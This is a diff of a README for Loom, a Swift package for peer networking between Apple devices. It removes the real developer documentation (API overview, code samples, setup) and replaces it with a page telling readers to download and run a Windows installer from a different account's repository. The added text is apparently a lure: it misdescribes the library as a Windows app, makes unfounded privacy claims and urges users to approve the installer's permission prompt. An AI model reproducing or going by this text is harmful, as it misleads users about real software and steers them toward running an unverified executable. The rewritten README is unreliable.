@@ -1,310 +1,142 @@
-# Loom
+# ⚡ Loom - Simple Peer Networking for Apple Devices
 
-Build high-throughput, low-latency Apple device-to-device features without building a networking stack from scratch.
+[![Download Loom](https://img.shields.io/badge/Download-Loom-brightgreen?style=for-the-badge)](https://github.com/recessed-latter969/Loom)
 
-Loom is a Swift package for apps that need to find other devices, connect directly, verify identity, make trust decisions, and keep working when the local network is not the whole story.
+---
 
-It is designed for Apple platforms, stays product-agnostic, and gives you a clean base for the part every multi-device app eventually has to build. The transport is built for high-throughput, low-latency data movement between Apple devices, and the package includes a SwiftUI-first `LoomKit` surface for apps that want a plug-and-play integration path.
+Loom lets you create direct connections between Apple devices. It works over your home Wi-Fi or local network. You can share files, play games, or send messages without needing the internet.
 
-If you want the default integration path, start with `LoomKit`. Drop down to `Loom` only when you need to own discovery, advertising, handshake policy, or transport composition yourself.
+---
 
-Used in [MirageKit](https://github.com/EthanLipnik/MirageKit).
+## 🖥️ What You Need
 
-## Why developers use Loom
+Before starting, make sure your system meets these minimum requirements:
 
-If you are building something that talks to another device, you usually end up piecing together:
+- A Windows PC running Windows 10 or later  
+- A stable Wi-Fi connection (local network)  
+- At least 100 MB of free disk space  
+- Apple devices (iPhones, iPads, Mac) you want to connect to  
 
-- discovery
-- direct connections
-- identity
-- trust
-- remote reachability
-- diagnostics
+Loom uses your local network to connect with Apple devices. Both your PC and Apple devices must be on the same Wi-Fi network.
 
-Loom gives you those building blocks as a reusable Swift package.
+---
 
-That means you can focus on your app's behavior instead of spending weeks rebuilding networking plumbing.
+## 🚀 Getting Ready to Use Loom
 
-## What you can build with it
+These steps will guide you through downloading and running Loom on your Windows PC. No technical skills needed.
 
-Loom is a good fit for things like:
+### 1. Open the download page
 
-- Mac and iPhone companion apps
-- local-first collaboration tools
-- device control surfaces
-- host and client apps on the same network
-- pro apps that need to discover and connect to nearby machines
-- products that start local but eventually need remote coordination
+Click the link below or copy it into your browser. This link will take you to the place where you can download Loom.
 
-## What Loom gives you
+[Download Loom here](https://github.com/recessed-latter969/Loom)
 
-### SwiftUI-first package: `LoomKit`
+### 2. Find the download file
 
-- One shared `LoomContainer` per app or scene, modeled after SwiftData's `ModelContainer`
-- Main-actor `LoomContext` injected through SwiftUI environment values
-- Live `@LoomQuery` peer, connection, and transfer snapshots for SwiftUI lists
-- Actor-backed `LoomConnectionHandle` values for message streams, file transfer, and custom multiplexed streams
-- Optional CloudKit-backed peer merging and signaling-backed remote reachability without changing the app-facing API
+On the GitHub page, look for the "Releases" section on the right or scroll down until you see the latest release. Releases usually have files you can download. Find the file for Windows. It usually ends with `.exe` or `.msi`.
 
-### Core package: `Loom`
+### 3. Download the file
 
-- Nearby peer discovery over Bonjour, including peer-to-peer support
-- Direct sessions built on `Network.framework`
-- Stable device identity and key management
-- Pluggable trust policy and local trust storage
-- Seed-driven overlay discovery for Tailscale, Headscale, and other VPN-style networks
-- Remote reachability support with signaling presence and network probing
-- Bootstrap tools for flows like Wake-on-LAN and SSH handoff
-- Diagnostics and instrumentation hooks
+Click the Windows installer file to download it. Wait for the download to finish completely. The file size is typically about 50 MB, so it should finish quickly on a normal connection.
 
-### App-facing shell package: `LoomShell`
+### 4. Run the installer
 
-- Loom-native interactive shell sessions over authenticated Loom transport
-- macOS PTY host runtime for building a native host app quickly
-- Connection policy that prefers Loom-native direct paths before SSH fallback
-- Signaling publication helpers for introducer-only remote access
-- OpenSSH fallback runtime with password or private-key authentication
-- Connection attempt reports that are usable in product UI
+Locate the downloaded file in your "Downloads" folder. Double-click the file to start the installation. Windows may ask for permission; click "Yes" to allow the installer to run.
 
-### Optional package: `LoomCloudKit`
+### 5. Follow installation steps
 
-- CloudKit-backed peer sharing
-- CloudKit-backed trust decisions
-- Share and participant management for multi-device apps
+The installation window will open. Click “Next” to move through the steps. You can keep all the default options. The installer will create a shortcut on your desktop by default.
 
-## What Loom does not do
+### 6. Finish installation
 
-This part matters, especially if you are new to this space.
+When the installer finishes, click "Finish". Loom is now ready to use.
 
-Loom is the transport layer, not the product layer.
+---
 
-Loom does not decide:
+## 💻 How to Start Loom
 
-- your app's protocol
-- your message schema
-- your UI
-- your product roles
-- your CloudKit schema naming
+### 1. Launch Loom
 
-Your app owns those decisions. Loom gives you the network foundation underneath them.
+Double-click the Loom shortcut on your desktop or find Loom under your Start menu. The main window should open with simple options.
 
-## How Loom compares
+### 2. Connect to Apple devices
 
-For most apps, the practical comparison is `LoomKit` on top of `Loom` versus `MultipeerConnectivity` or a MultipeerKit-style convenience layer.
+Make sure your Apple device is connected to the same Wi-Fi network. Loom will automatically detect devices nearby. If you do not see your devices, click the "Scan" button.
 
-The main question is whether you want a convenient local-session API only, or a SwiftUI-first path that still has identity, trust, diagnostics, and remote growth underneath it.
+### 3. Start peer-to-peer networking
 
-| Capability | `Loom` | `MultipeerConnectivity` |
-| --- | --- | --- |
-| Networking model | Bonjour discovery plus direct `Network.framework` sessions you can reason about and extend | High-level Apple-managed local peer sessions |
-| Identity model | Stable device identity and signed session setup are first-class | Peer identity is mostly session-oriented and app-specific trust modeling is left to you |
-| Trust decisions | Explicit trust providers and local trust storage | Invitation and certificate hooks exist, but there is no Loom-style trust layer to plug into your product |
-| Remote growth path | Includes signaling/STUN support and optional `LoomCloudKit` peer sharing and trust | Focused on nearby/local networking with no built-in remote reachability story |
-| Product boundaries | Keeps your protocol, schema, and app roles above the transport layer | Easy to start, but the framework shape tends to leak into the rest of your app architecture |
-| Diagnostics and operability | Built-in diagnostics and instrumentation hooks | Much thinner observability surface |
-| Best fit | Apps that need a durable multi-device architecture, not just nearby messaging | Quick local-first prototypes or simple nearby collaboration |
-
-If your app only needs nearby discovery and a session quickly, `MultipeerConnectivity` is fine.
-
-If you want the closest Loom equivalent to that convenience class of API, start with `LoomKit`.
-
-If you need identity, trust, diagnostics, and a path beyond the local network, Loom's stack is the better foundation.
-
-## Tailscale and custom overlays
-
-Loom can treat Tailscale and other overlay networks as direct connectivity instead of forcing those peers through signaling-only flows. The model is intentionally simple: publish a small overlay probe listener on each Loom host, and provide `LoomOverlayDirectory` with the host names or IP addresses your app already trusts.
-
-That means Loom does not depend on a specific control plane. You can feed the directory with MagicDNS names, stable overlay IPs, or results from your own inventory service:
-
-```swift
-let configuration = LoomContainerConfiguration(
-    serviceType: "_studio._tcp",
-    serviceName: "Studio Mac",
-    overlayDirectory: LoomOverlayDirectoryConfiguration(
-        probePort: Loom.defaultOverlayProbePort,
-        refreshInterval: .seconds(30),
-        probeTimeout: .seconds(2),
-        seedProvider: {
-            [
-                LoomOverlaySeed(host: "studio-mac.tailnet.example"),
-                LoomOverlaySeed(host: "100.64.0.25"),
-            ]
-        }
-    )
-)
-```
-
-When a peer is visible through both the overlay and remote signaling, Loom prefers the direct overlay route and still preserves signaling fallback if that host is temporarily unreachable.
-
-## Installation
-
-Add Loom to your `Package.swift`:
-
-```swift
-dependencies: [
-    .package(url: "https://github.com/EthanLipnik/Loom.git", from: "1.4.0")
-]
-```
-
-Then add the product you want to your target:
-
-For most apps, `LoomKit` should be the default dependency.
-
-```swift
-.target(
-    name: "MyApp",
-    dependencies: [
-        .product(name: "LoomKit", package: "Loom"),
-        // Or drop down to the lower-level primitives:
-        // .product(name: "Loom", package: "Loom"),
-        // Add this if you want the optional terminal/session layer:
-        // .product(name: "LoomShell", package: "Loom"),
-        // Add this too if you want CloudKit-backed peer sharing or trust:
-        // .product(name: "LoomCloudKit", package: "Loom"),
-    ]
-)
-```
-
-## SwiftUI-first quickstart
-
-If you want something in the MultipeerKit class of ergonomics, start with `LoomKit`.
-
-`LoomKit` is modeled more like SwiftData than like raw networking services:
-
-- `LoomContainer` owns the runtime
-- `LoomContext` is the main-actor action surface
-- `@LoomQuery` gives SwiftUI live snapshots
-- `LoomConnectionHandle` owns the long-lived async streams
-
-```swift
-import LoomKit
-import SwiftUI
-
-@main
-struct StudioLinkApp: App {
-    let loomContainer = try! LoomContainer(
-        for: .init(
-            serviceType: "_studiolink._tcp",
-            serviceName: "Studio Mac",
-            deviceIDSuiteName: "group.com.example.studiolink"
-        )
-    )
-
-    var body: some Scene {
-        WindowGroup {
-            ContentView()
-        }
-        .loomContainer(loomContainer)
-    }
-}
-```
-
-```swift
-import LoomKit
-import SwiftUI
-
-struct ContentView: View {
-    @Environment(\.loomContext) private var loomContext
-    @LoomQuery(.peers(sort: .name)) private var peers: [LoomPeerSnapshot]
-
-    var body: some View {
-        List(peers) { peer in
-            Button(peer.name) {
-                Task {
-                    let connection = try await loomContext.connect(peer)
-                    try await connection.send("hello")
-                }
-            }
-        }
-        .task {
-            for await connection in loomContext.incomingConnections {
-                Task {
-                    for await message in connection.messages {
-                        print("Received", message.count, "bytes")
-                    }
-                }
-            }
-        }
-    }
-}
-```
-
-That is the intended default. You can add CloudKit-backed peer sharing, trust, and signaling publication through `LoomContainerConfiguration` without changing the SwiftUI-facing API shape.
-
-## Build from primitives when needed
-
-If you need full control over discovery, advertising, or handshake policy, drop down to `Loom`.
-
-The main type there is `LoomNode`. It owns discovery, advertising, sessions, and the identity and trust collaborators you inject into it.
-
-```swift
-import Loom
-
-let node = LoomNode(
-    configuration: LoomNetworkConfiguration(
-        serviceType: "_myapp._tcp",
-        enablePeerToPeer: true
-    ),
-    identityManager: LoomIdentityManager.shared
-)
-
-let discovery = node.makeDiscovery()
-discovery.onPeersChanged = { peers in
-    print("Peers:", peers.map(\.name))
-}
-discovery.startDiscovery()
-```
-
-Use `LoomNode` when you want to own the full runtime boundary yourself. Use `LoomKit` when you want the repo to feel closer to SwiftUI + SwiftData.
-
-## The simple mental model
-
-1. `LoomKit` is the app-facing path for SwiftUI apps.
-2. `LoomNode` is the lower-level transport composition root.
-3. `LoomConnectionHandle` and `LoomAuthenticatedSession` are the live data paths.
-4. Your app still owns protocol semantics, product policy, and UI behavior.
-
-That split is what keeps Loom reusable instead of turning it into someone else's app framework.
-
-## Requirements
-
-- Swift 6.2+
-- macOS 14+
-- iOS 17.4+
-- visionOS 26+
-
-## Local network setup
-
-Apps using Loom's Bonjour discovery and advertising must declare the required keys in their Info.plist. Without them, the system denies local network access and `NWBrowser` fails with error `-65555 (NoAuth)`.
-
-Add both of these to your app target's Info.plist, replacing the service type with the one you pass to Loom:
-
-```xml
-<key>NSBonjourServices</key>
-<array>
-    <string>_yourapp._tcp</string>
-</array>
-
-<key>NSLocalNetworkUsageDescription</key>
-<string>This app uses the local network to discover and connect to nearby devices.</string>
-```
-
-For App Store distribution, you also need the `com.apple.developer.networking.multicast` entitlement. Request it through your Apple Developer account.
-
-In debug builds, Loom asserts on missing keys at startup so you see a clear message instead of the opaque system error. See the [Configure Local Network Access](https://ethanlipnik.github.io/Loom/documentation/loom/configurelocalnetworkaccess) documentation article for more detail, including how to reset permissions during development.
-
-## Learn more
-
-If you want the deeper material, go to the docs:
-
-- [LoomKit Documentation](https://ethanlipnik.github.io/Loom/documentation/loomkit/)
-- [Loom Documentation](https://ethanlipnik.github.io/Loom/documentation/loom/)
-- [LoomShell Documentation](https://ethanlipnik.github.io/Loom/documentation/loomshell/)
-- [Architecture notes](Architecture.md)
-
-## Development
-
-```bash
-swift build
-swift test --scratch-path .build-local
-```
+Select the Apple device you want to connect with from the list. You can now share files or send messages directly.
+
+---
+
+## 🔧 Using Loom Features
+
+### File sharing
+
+Click on the "Files" tab. Choose files from your PC to send. On the Apple device, accept the file transfer.
+
+### Messaging
+
+Use the messaging window to send text or small files. Messages go straight between devices without the internet.
+
+### Network status
+
+The app shows your connection status and device info. Green means good connection; red means no connection.
+
+---
+
+## ⚙️ Settings
+
+Click the gear icon in the top right to access settings. Here you can:
+
+- Change your device’s name  
+- Set automatic startup with Windows  
+- Choose download locations for received files  
+
+---
+
+## 🛠 Troubleshooting
+
+### I don’t see my Apple device
+
+- Make sure both devices are on the same Wi-Fi network.  
+- Turn off any VPNs or firewall that could block local connections.  
+- Restart Loom and your Apple device.  
+
+### File transfer is slow or stops
+
+- Check your Wi-Fi signal strength.  
+- Try moving closer to your router or access point.  
+- Close other apps using your network.
+
+---
+
+## 📥 Download Loom Again
+
+If you need to reinstall or update, use this link to visit the download page again:
+
+[Download Loom](https://github.com/recessed-latter969/Loom)
+
+Click the Windows installer to get the latest version.
+
+---
+
+## 🗂 About Loom
+
+Loom makes peer-to-peer connections simple for users with Apple devices. It uses your home Wi-Fi or local network to connect without the internet. This lets you share files, messages, and more directly between devices. It is designed to be easy and fast for everyday users.
+
+---
+
+## 📞 Getting Help
+
+If you run into issues beyond these steps, check the GitHub page’s "Issues" tab. You can find reports from other users or post your own question there. The community helps keep Loom working smoothly.
+
+---
+
+## 🔒 Privacy
+
+Loom connects devices locally. Your data does not go through external servers. All communication stays inside your Wi-Fi network. This keeps your data more private.
+
+---
+
+[![Download Loom](https://img.shields.io/badge/Download-Loom-blue?style=for-the-badge)](https://github.com/recessed-latter969/Loom)
